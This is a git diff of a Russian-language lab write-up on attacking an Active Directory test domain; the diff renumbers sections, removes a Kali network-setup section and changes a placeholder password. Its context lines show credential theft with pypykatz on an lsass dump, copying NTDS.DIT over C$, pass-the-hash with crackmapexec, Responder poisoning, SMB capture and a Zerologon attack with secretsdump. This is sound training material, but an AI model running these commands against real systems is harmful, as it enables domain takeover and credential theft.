@@ -45,23 +45,9 @@ sudo apt install mitm6
 - Доступ в интернет активен
 
 
-# Конфигурация Kali Linux и выполнение атак 
+# Kali Linux и выполнение атак 
 
-## 4. Настройка Kali
-
-Kali настроен на получение IP-адреса по DHCP.
-
-В настройках сети был также указан публичный DNS:
-```bash
-DNS: 8.8.8.8
-```
-
-Проверка IP-адреса:
-![ip a](../screenshots/4_2_kali_ip_a.jpg)
-
----
-
-## 5. Извлечение паролей из памяти
+## 4. Извлечение паролей из памяти
 
 После получения дампа `lsass.DMP` выполнена команда:
 ```bash
@@ -73,7 +59,7 @@ pypykatz lsa minidump lsass.DMP
 
 ---
 
-## 6. Доступ к \C$ разделу, вытаскивание NTDS.DIT и SYSTEM
+## 5. Доступ к \C$ разделу, вытаскивание NTDS.DIT и SYSTEM
 
 ```bash
 smbclient \\10.0.68.5\c$ -U lab68.com/ADMpetr
@@ -97,7 +83,7 @@ crackmapexec smb 10.0.68.5 -u ADMpetr -H <NT_hash> -x ipconfig
 
 ---
 
-## 7. Отравление кеша LLMNR и NBT-NS
+## 6. Отравление кеша LLMNR и NBT-NS
 
 Атака с использованием `responder`:
 ```bash
@@ -108,7 +94,7 @@ sudo responder -I eth0
 
 ---
 
-## 8. Настройка общего доступа на Windows 10 и перехват SMB-сессии
+## 7. Настройка общего доступа на Windows 10 и перехват SMB-сессии
 
 На Windows была создана открытая папка `SHARE`:
 ![share](../screenshots/8_4_win10_share.jpg)
@@ -123,7 +109,7 @@ impacket-smbserver -smb2support Share /home/kali/111
 
 ---
 
-## 9. Атака Zerologon
+## 8. Атака Zerologon
 
 Запуск атаки:
 ```bash
@@ -140,12 +126,12 @@ impacket-secretsdump -hashes :<ntlm_hash> 'LAB68/POD68-WS2016$@10.0.68.5'
 
 ---
 
-## 10. Восстановление состояния
+## 9. Восстановление состояния (дополнительно)
 
 После атаки Zerologon необходимо восстановить пароль для учетной записи контроллера домена:
 ```bash
 rpcclient -U "" 10.0.68.5
-> setuserinfo2 "POD68-WS2016$" 23 "<StrongPassword123!>"
+> setuserinfo2 "POD68-WS2016$" 23 "<P@ssw0rd>"
 ```
 
 ---
